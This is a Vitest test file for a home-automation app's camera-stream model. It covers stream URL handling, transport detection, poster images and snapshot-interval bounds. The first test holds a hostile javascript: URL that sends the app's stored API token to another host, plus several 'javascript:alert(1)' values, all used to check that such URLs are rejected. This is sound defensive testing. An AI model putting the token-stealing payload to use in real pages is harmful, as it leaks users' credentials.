import { describe, expect, it } from 'vitest'
import { guessTransport, isConfigured, posterUrl, snapshotPeriodMs, transportChain, transportUrl, type CameraConfig } from './model'

const direct = (url: string, extra: Partial<CameraConfig> = {}): CameraConfig => ({ source: 'url', url, ...extra })

describe('a direct stream URL', () => {
  it('never hands a script URL to a frame, a video or an image', () => {
    const hostile = "javascript:fetch('//x/?'+localStorage['neohab:apiToken'])//a.html"
    const config = direct(hostile, { posterUrl: 'javascript:alert(1)' })
    for (const tr of transportChain(config)) expect(transportUrl(config, tr), tr).toBeNull()
    for (const tr of ['iframe', 'snapshot', 'mjpeg', 'hls'] as const) expect(transportUrl(config, tr), tr).toBeNull()
    expect(posterUrl(config)).toBeNull()
    expect(isConfigured(config)).toBe(false)
  })

  it('still plays every kind of stream it took before', () => {
    for (const url of ['http://cam/live.m3u8', 'https://cam/x.mjpeg', 'ws://go2rtc:1984/api/ws?src=a', 'http://cam/snap.jpg']) {
      const config = direct(url)
      expect(isConfigured(config), url).toBe(true)
      expect(transportUrl(config, transportChain(config)[0]), url).toBe(url)
    }
  })

  it('shows a still that is a still, never the live stream as its poster', () => {
    expect(posterUrl(direct('http://cam/video.mjpeg'))).toBeNull()
    expect(posterUrl(direct('http://cam/live.m3u8'))).toBeNull()
    expect(posterUrl(direct('http://cam/snap.jpg'))).toBe('http://cam/snap.jpg')
    expect(posterUrl(direct('http://cam/video.mjpeg', { posterUrl: 'http://cam/still.jpg' }))).toBe('http://cam/still.jpg')
  })
})

describe('a camera server', () => {
  it('builds its addresses from the server and stream, whatever the server field holds', () => {
    const config: CameraConfig = { source: 'go2rtc', server: 'javascript:alert(1)', stream: 'door' }
    for (const tr of transportChain(config)) {
      const url = transportUrl(config, tr) ?? ''
      expect(/^(https?|wss?):\/\//.test(url), url).toBe(true)
    }
  })

  it('names the transport a URL implies', () => {
    expect(guessTransport('http://cam/x.m3u8?token=1')).toBe('hls')
    expect(guessTransport('wss://cam/api/ws')).toBe('webrtc')
    expect(guessTransport('http://cam/stream.html')).toBe('iframe')
  })
})

describe('the snapshot period', () => {
  it('is bounded whatever was stored', () => {
    expect(snapshotPeriodMs({ snapshotInterval: 5 })).toBe(5000)
    expect(snapshotPeriodMs({ snapshotInterval: '5s' as unknown as number })).toBe(5000)
    expect(snapshotPeriodMs({ snapshotInterval: 0.01 })).toBe(1000)
    expect(snapshotPeriodMs({ snapshotInterval: 1e12 })).toBe(3_600_000)
  })
})
